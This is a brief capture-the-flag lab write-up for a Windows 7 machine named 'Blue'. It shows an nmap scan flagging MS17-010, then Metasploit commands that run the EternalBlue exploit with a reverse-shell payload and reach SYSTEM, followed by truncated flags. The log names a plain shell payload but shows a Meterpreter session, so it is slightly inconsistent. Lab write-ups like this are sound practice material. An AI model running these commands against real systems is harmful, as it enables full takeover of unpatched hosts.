---
title: "Blue"
date: 2024-02-20
type: "labs"
difficulty: "Easy"
pwned: true
tags: ["windows", "eternalblue", "ms17-010", "smb"]
summary: "Windows 7 vulnerável ao EternalBlue — exploit icônico da NSA vazado pelo Shadow Brokers."
machine_info:
  OS: Windows 7
  IP: 10.10.10.40
  CVE: MS17-010
---

## Nmap

```bash
$ nmap -sV --script vuln 10.10.10.40
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```

## Exploit — EternalBlue

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit > set payload windows/x64/shell_reverse_tcp
msf6 exploit > set RHOSTS 10.10.10.40
msf6 exploit > run

[*] Meterpreter session 1 opened

meterpreter > getuid
NT AUTHORITY\SYSTEM
```

## Flags

```
c:\Users\haris\Desktop\user.txt  → 4c546ebb4f...
c:\Users\Administrator\Desktop\root.txt → ff548eb71e...
```
